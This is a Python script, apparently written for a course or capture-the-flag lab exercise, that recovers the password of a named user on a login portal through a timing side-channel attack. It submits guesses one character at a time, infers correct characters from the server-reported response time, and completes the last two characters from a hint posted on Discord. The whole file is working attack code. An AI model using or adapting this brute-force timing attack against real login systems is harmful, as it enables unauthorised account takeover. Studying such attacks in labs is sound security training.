import requests
from json.decoder import JSONDecodeError


def login(attempt_pw, a):
    url = 'https://portal.regjeringen.uiaikt.no/login'
    uname = 'jonas.dahl'
    d = {'username': uname, 'password': attempt_pw}
    res = requests.post(url, json=d)
    try:

        res.raise_for_status()  # Raise an HTTPError for bad responses

        json_data = res.json()
        tot_time = json_data['total_time']

        if tot_time > a + 1:
            return True
        else:
            return False
    #Chatgpt generated exception that checks for json errors
    except JSONDecodeError:
        # Handle JSON decoding error
        print("JSON decoding error. Response content:", res.text)
        return False
    # Chatgpt generated exception that checks for other errors
    except requests.exceptions.RequestException as e:

        print(f"Request error: {e}")
        return False


def solve_password():
    print("ATTACK !!!!!!")
    # Based on bruteforce attempts, we know that the cycle changes when passwordlength is 17
    pw = '11111111111111111'
    # All valid password characters, used to crack password
    validchar = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    # empty string to store password
    jonas_pw = ''
    # index for characters found
    a = 0
    while True:
        for valid in validchar:
            pw = pw[:a] + valid + pw[a + 1:]
            # statement that
            if login(pw, a):
                jonas_pw += valid
                print(jonas_pw)
                break
        a += 1
        if a == 17:
            break
    #Notefrom discord "Hint:  det er en bug i timing attacket. Dere får ut 15 av 17. De siste to karakterene i
    # passordet er 23"
    print(f"Found: {jonas_pw}23")


    return jonas_pw

if __name__ == "__main__":
    solve_password()
